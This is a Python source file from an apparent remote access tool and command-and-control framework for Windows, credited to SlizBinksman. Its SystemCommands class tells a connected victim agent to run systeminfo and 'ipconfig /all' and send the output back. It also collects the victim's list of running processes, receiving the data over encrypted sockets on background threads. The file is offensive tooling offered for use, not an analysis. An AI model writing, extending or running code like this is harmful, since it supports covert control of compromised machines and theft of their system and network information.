#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.22
# -------------------------------------------------------------
from core.networking.sockets.server_socket import ServerSocket
from core.networking.sockets.receiver_socket import ReceiverSocket
from core.threading.threads import MultiThreading
from core.client_handling.flags import ClientActionFlags
from core.utils.file_paths import DSFilePath
class SystemCommands:

    #Function will create receiver socket and tell agent to send output of systeminfo and ipconfig /all commands
    def exfil_sys_and_ip_info(self,encryption_key,client):
        MultiThreading().create_background_thread_arg_arg(ReceiverSocket().recv_and_log_data,DSFilePath().sys_info_file ,encryption_key) #Create thread to catch data from agent
        flag = f'{ClientActionFlags().extract_sys_ip_info}{ClientActionFlags().seperator} '             #Action flag
        ServerSocket().send_data_to_client(client,encryption_key,flag)                                         #Tell client to run commands

    #Function will create receiver socket and instruct agent to send list of running process's on machine
    def extract_running_process(self,encryption_key,client):
        MultiThreading().create_background_thread_arg_arg(ReceiverSocket().recv_and_log_data,DSFilePath().task_manager_file,encryption_key) #Create background thread
        flag = f'{ClientActionFlags().task_manager}{ClientActionFlags().seperator} '                        #Generate flag string
        ServerSocket().send_data_to_client(client,encryption_key,flag)                                      #Send data to client